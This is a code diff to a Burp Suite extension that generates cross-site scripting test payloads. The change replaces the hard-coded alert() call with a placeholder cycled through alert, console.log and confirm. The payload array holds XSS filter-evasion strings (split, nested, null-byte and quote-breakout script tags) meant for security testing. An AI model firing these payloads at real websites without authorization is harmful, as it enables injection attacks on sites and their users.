@@ -41,9 +41,16 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntrud
     // tab within Burp.
     private static String phantomServer = "http://127.0.0.1:8093";
     
+    // Trigger phrase is sent as the payload, and compared
+    // when the payload is executed to ensure we're not
+    // logging false positives
     private static String triggerPhrase = "f7sdgfjFpoG";
+    // If payload executes successfully, grepPhrase will be
+    // prepending to the HTML response body, and we can grep
+    // for that.
     private static String grepPhrase = "fy7sdufsuidfhuisdf";
     
+    // Swing components
     public JPanel mainPanel, serverConfig;
     public JTextField phantomURL, grepVal;
     public JTabbedPane tabbedPane;
@@ -57,28 +64,31 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntrud
      * that it was passed via the Burp payload.
      * 
      * This is used to reduce the likelihood of false-positives.
+     * 
+     * {FUNCTION} is a placeholder that allows us to dynamically
+     * specify the payload function, such as alert, confirm, etc.
      */
     public static final byte[][] PAYLOADS = {
-		("<script>alert('" + triggerPhrase + "')</script>").getBytes(),
-		("<scr ipt>alert('" + triggerPhrase + "')</scr ipt>").getBytes(),
-		("\"><script>alert('" + triggerPhrase + "')</script>").getBytes(),
-		("\"><script>alert('" + triggerPhrase + "')</script><\"").getBytes(),
-		("'><script>alert('" + triggerPhrase + "')</script>").getBytes(),
-		("'><script>alert('" + triggerPhrase + "')</script><'").getBytes(),
-		("<SCRIPT>alert('" + triggerPhrase + "');</SCRIPT>").getBytes(),
-		("<scri<script>pt>alert('" + triggerPhrase + "');</scr</script>ipt>").getBytes(),
-		("<SCRI<script>PT>alert('" + triggerPhrase + "');</SCR</script>IPT>").getBytes(),
-		("<scri<scr<script>ipt>pt>alert('" + triggerPhrase + "');</scr</sc</script>ript>ipt>").getBytes(),
-		("\";alert('" + triggerPhrase + "');\"").getBytes(),
-		("';alert('" + triggerPhrase + "');'").getBytes(),
-		(";alert('" + triggerPhrase + "');").getBytes(),
-		("<SCR%00IPT>alert(\\\"" + triggerPhrase + "\\\")</SCR%00IPT>").getBytes(),
+		("<script>{FUNCTION}('" + triggerPhrase + "')</script>").getBytes(),
+		("<scr ipt>{FUNCTION}('" + triggerPhrase + "')</scr ipt>").getBytes(),
+		("\"><script>{FUNCTION}('" + triggerPhrase + "')</script>").getBytes(),
+		("\"><script>{FUNCTION}('" + triggerPhrase + "')</script><\"").getBytes(),
+		("'><script>{FUNCTION}('" + triggerPhrase + "')</script>").getBytes(),
+		("'><script>{FUNCTION}('" + triggerPhrase + "')</script><'").getBytes(),
+		("<SCRIPT>{FUNCTION}('" + triggerPhrase + "');</SCRIPT>").getBytes(),
+		("<scri<script>pt>{FUNCTION}('" + triggerPhrase + "');</scr</script>ipt>").getBytes(),
+		("<SCRI<script>PT>{FUNCTION}('" + triggerPhrase + "');</SCR</script>IPT>").getBytes(),
+		("<scri<scr<script>ipt>pt>{FUNCTION}('" + triggerPhrase + "');</scr</sc</script>ript>ipt>").getBytes(),
+		("\";{FUNCTION}('" + triggerPhrase + "');\"").getBytes(),
+		("';{FUNCTION}('" + triggerPhrase + "');'").getBytes(),
+		(";{FUNCTION}('" + triggerPhrase + "');").getBytes(),
+		("<SCR%00IPT>{FUNCTION}(\\\"" + triggerPhrase + "\\\")</SCR%00IPT>").getBytes(),
 		("<SCRIPT>a=/" + triggerPhrase + "/").getBytes(),
-		("\\\";alert('" + triggerPhrase + "');//").getBytes(),
-		("<STYLE TYPE=\"text/javascript\">alert('" + triggerPhrase + "');</STYLE>").getBytes(),
-		("<scr\nipt>alert('" + triggerPhrase + "')</scr\nipt>").getBytes(),
-		("<scr\nipt>alert('" + triggerPhrase + "')</scr\nipt>").getBytes(),
-		("<<SCRIPT>alert('" + triggerPhrase + "')//<</SCRIPT>").getBytes(),	
+		("\\\";{FUNCTION}('" + triggerPhrase + "');//").getBytes(),
+		("<STYLE TYPE=\"text/javascript\">{FUNCTION}('" + triggerPhrase + "');</STYLE>").getBytes(),
+		("<scr\nipt>{FUNCTION}('" + triggerPhrase + "')</scr\nipt>").getBytes(),
+		("<scr\nipt>{FUNCTION}('" + triggerPhrase + "')</scr\nipt>").getBytes(),
+		("<<SCRIPT>{FUNCTION}('" + triggerPhrase + "')//<</SCRIPT>").getBytes(),	
     };
 	
     // These payloads don't work in webkit, but may in slimer
@@ -227,9 +237,14 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntrud
 	 * 
 	 * In this case, simply iterate over the payloads defined
 	 * in the parent class.	
+	 * 
+	 * @todo: Added processing for different functions
 	 */
 	class IntruderPayloadGenerator implements IIntruderPayloadGenerator {
 		int payloadIndex;
+		
+		String functions[] = new String[] {"alert", "console.log", "confirm"};
+		int functionIndex = 0;
 		
 		@Override
 		public boolean hasMorePayloads() {
@@ -237,10 +252,22 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntrud
 		}
 		
 		@Override
-		public byte[] getNextPayload(byte[] baseValue) {			
+		public byte[] getNextPayload(byte[] baseValue) {
 			byte[] payload = PAYLOADS[payloadIndex];
-			payloadIndex++;
-			return payload;
+			
+			// Shift to next payload
+			if (functionIndex >= functions.length ) {
+				functionIndex = 0;
+				payloadIndex++;
+			}
+			
+			
+			String nextPayload = new String(payload);
+			nextPayload =  nextPayload.replace("{FUNCTION}", functions[functionIndex]);
+			stdout.println("Payload conversion: " + nextPayload);
+		
+			functionIndex++;
+			return nextPayload.getBytes();
 		}
 		
 		@Override
